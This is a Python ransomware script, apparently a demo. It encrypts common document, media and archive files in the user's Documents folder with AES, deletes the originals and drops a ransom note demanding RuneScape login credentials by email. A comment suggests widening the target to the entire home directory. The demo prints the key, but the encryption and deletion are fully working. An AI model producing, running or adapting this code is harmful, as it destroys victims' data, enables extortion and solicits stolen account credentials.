import os, base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def find_files(directory, extensions):
    files = []
    for root, _, filenames in os.walk(directory):
        for filename in filenames:
            if filename.endswith(extensions) and filename != 'YOU_HAVE_BEEN_HACKED.txt':
                files.append(os.path.join(root, filename))
    return files

def aes_operation(key, data, mode):
    backend = default_backend()
    iv = os.urandom(16) if mode == 'encrypt' else data[:16]
    cipher = Cipher(algorithms.AES(key), modes.CFB8(iv), backend=backend)
    processor = cipher.encryptor() if mode == 'encrypt' else cipher.decryptor()
    return processor, iv

def decrypt_files(input, files, directory):
    for file in files:
        with open(file, "rb") as f:
            data = f.read()
        try:
            key = base64.b64decode(input.encode('utf-8'))
            decryptor, _ = aes_operation(key, data, 'decrypt')
            decrypted_data = decryptor.update(data[16:]) + decryptor.finalize()
        except: 
            print("Wrong code buddy.")
            main()
        with open(file + ".decrypted", "wb") as f:
            f.write(decrypted_data)
        os.remove(file)
        os.rename(file + ".decrypted", file)
    os.remove(os.path.join(directory,"YOU_HAVE_BEEN_HACKED.txt"))

def main():
    # Feel free to add whatever file extensions you want to encrypt. These are some of the more common ones.
    extensions = (".txt", ".doc", ".docx", ".pdf", ".rtf",
              ".xlsx", ".xls", ".csv", ".ppt", ".pptx",
              ".mdb", ".accdb", ".jpg", ".jpeg", ".png",
              ".gif", ".bmp", ".zip", ".rar", ".7z",
              ".tar", ".gz", ".tgz", ".mp3", ".wav",
              ".mp4", ".avi", ".mkv", ".mov", ".wmv")

    # For demonstration I'm only hijacking Documents folder.
    # To make the malware extra painful you could encrypt all files in the users path.
    # Simply change directory to `os.path.expanduser('~')`
    directory = os.path.expanduser('~/Documents')
    files = find_files(directory, extensions)

    if os.path.exists(os.path.join(directory, "YOU_HAVE_BEEN_HACKED.txt")):
        user_input = input("Enter the right code or else: ")
        decrypt_files(user_input, files, directory)
    else:
        key = os.urandom(32)
        correct_code = base64.b64encode(key).decode('utf-8')

        for file in files:
            with open(file, "rb") as f:
                data = f.read()
            encryptor, iv = aes_operation(key, data, 'encrypt')
            with open(file + ".encrypted", "wb") as f:
                f.write(iv + (encryptor.update(data) + encryptor.finalize()))
            os.remove(file)
            os.rename(file + ".encrypted", file)

        hacked_text = f'''All of your files have been encrypted! 
IF YOU ATTEMPT TO MODIFY/DELETE ANY OF THE FILES, YOU WILL NEVER GET THEM BACK TO NORMAL!!!
To unlock them, send your runescape account login info to email@email.com

Normally I'd send you the decryption key after recieving the goods,
but because this is a demo I'll display it here.

DECRYPTION CODE HERE:
{correct_code}

Enter the key in the program to unlock your files.'''
    
        with open(os.path.join(directory,"YOU_HAVE_BEEN_HACKED.txt"), "w") as f:
            f.write(hacked_text)

        user_input = input("Enter decryption code: ")
        decrypt_files(user_input, files, directory)

if __name__ == "__main__":
    main()